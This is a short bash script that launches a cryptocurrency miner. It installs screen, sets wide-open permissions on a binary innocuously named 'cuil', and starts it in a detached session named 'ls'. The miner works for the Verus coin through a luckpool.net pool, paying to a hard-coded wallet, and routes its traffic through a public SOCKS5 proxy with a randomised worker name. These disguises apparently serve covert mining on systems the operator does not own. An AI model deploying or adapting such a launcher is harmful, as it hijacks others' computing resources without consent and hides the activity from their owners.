#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x gas.sh && chmod +x cuil && chmod 777 cuil gas.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RPkwwC1SL8QNjP1X242btbLA8othyHMRC9
WORKER=$(echo $(shuf -i 1-20 -n 1)-AMDryzen)
PROXY=socks5://70.166.167.36:4145
./cuil -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
